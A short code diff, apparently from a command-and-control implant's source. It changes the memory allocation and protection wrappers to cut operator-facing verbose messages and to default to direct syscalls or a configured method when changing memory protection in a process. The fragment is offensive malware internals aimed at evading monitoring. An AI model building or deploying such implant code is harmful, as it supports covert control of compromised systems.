@@ -19,7 +19,7 @@ PVOID MemoryAlloc(
     PVOID    Memory   = NULL;
     NTSTATUS NtStatus = STATUS_SUCCESS;
 
-    if ( Instance.Config.Implant.Verbose ) {
+    if ( Instance.Config.Implant.Verbose && ( Methode != DX_MEM_DEFAULT ) ) {
         Package = PackageCreate( DEMON_INFO );
         PackageAddInt32( Package, DEMON_INFO_MEM_ALLOC );
     }
@@ -95,13 +95,21 @@ BOOL MemoryProtect(
     ULONG     OldProtect = 0;
     BOOL      Success    = FALSE;
 
-    if ( Instance.Config.Implant.Verbose ) {
+    if ( Instance.Config.Implant.Verbose && ( Method != DX_MEM_DEFAULT ) ) {
         Package = PackageCreate( DEMON_INFO );
         PackageAddInt32( Package, DEMON_INFO_MEM_PROTECT );
     }
 
     switch ( Method )
     {
+        case DX_MEM_DEFAULT: PUTS( "DX_MEM_DEFAULT" ) {
+            if ( Instance.Config.Memory.Alloc != DX_MEM_DEFAULT ) {
+                return MemoryProtect( Instance.Config.Memory.Alloc, Process, Memory, Size, Protect );
+            } else {
+                return MemoryProtect( DX_MEM_SYSCALL, Process, Memory, Size, Protect );
+            }
+        }
+
         case DX_MEM_WIN32: {
             Success = Instance.Win32.VirtualProtectEx( Process, Memory, Size, Protect, &OldProtect );
             break;
